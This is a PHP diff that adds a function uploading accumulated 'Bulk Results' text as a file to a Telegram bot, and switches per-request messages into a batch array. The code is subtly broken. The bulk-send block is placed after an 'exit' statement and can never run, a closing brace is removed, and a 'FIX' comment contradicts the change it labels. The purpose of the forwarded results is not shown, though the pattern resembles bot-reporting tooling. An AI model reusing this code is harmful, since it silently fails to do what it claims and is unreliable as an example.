@@ -49,6 +49,43 @@ function sendToTelegram($text) {
     return $response;
 }
 
+/* ✅ ADD THIS FUNCTION RIGHT HERE */
+function sendBulkFile($text) {
+    $botToken = getenv('TG_BOT_TOKEN');
+    $chatId = getenv('TG_CHAT_ID');
+
+    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
+
+    $filePath = tempnam(sys_get_temp_dir(), 'bulk_') . '.txt';
+    file_put_contents($filePath, $text);
+
+    $postFields = [
+        'chat_id' => $chatId,
+        'document' => new CURLFile($filePath),
+        'caption' => "📦 Bulk Results"
+    ];
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $postFields,
+        CURLOPT_TIMEOUT => 30
+    ]);
+
+    $response = curl_exec($ch);
+
+    if ($response === false) {
+        error_log("Bulk Telegram Error: " . curl_error($ch));
+    }
+
+    curl_close($ch);
+    unlink($filePath);
+
+    return $response;
+}
+$bulkResults = [];
 //ORIGINAL
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
@@ -109,14 +146,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 "━━━━━━━━━━━━━━━━━━━━";
 
         // 🔥 FIX: send immediately (no bulk bug)
-        sendToTelegram($msg);
+        $bulkResults[] = $msg;
     }
 
     http_response_code($http_code);
     header('Content-Type: application/json');
     echo $response;
     exit;
- }
+
+    if (!empty($bulkResults)) {
+    $finalText = implode("\n\n", $bulkResults);
+    sendBulkFile($finalText);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
